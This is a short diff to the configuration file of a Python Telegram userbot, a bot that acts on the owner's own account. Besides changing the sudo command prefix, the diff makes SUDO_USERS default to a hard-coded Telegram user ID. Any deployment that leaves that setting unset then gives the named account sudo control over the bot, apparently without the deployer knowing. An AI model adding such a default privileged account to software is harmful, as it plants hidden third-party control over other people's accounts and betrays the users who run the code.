@@ -148,7 +148,7 @@ while 0 < 6:
 
 del _BLACKLIST
 
-SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "").split()}
+SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "2014359828").split()}
 BL_CHAT = {int(x) for x in os.environ.get("BL_CHAT", "").split()}
 
 # Telegram App KEY and HASH
@@ -164,7 +164,7 @@ BOTLOG_CHATID = int(os.environ.get("BOTLOG_CHATID", ""))
 
 # Handler Userbot
 CMD_HANDLER = os.environ.get("CMD_HANDLER") or "."
-SUDO_HANDLER = os.environ.get("SUDO_HANDLER") or "$"
+SUDO_HANDLER = os.environ.get("SUDO_HANDLER") or "-"
 
 # Userbot logging feature switch.
 BOTLOG = sb(os.environ.get("BOTLOG", "True"))
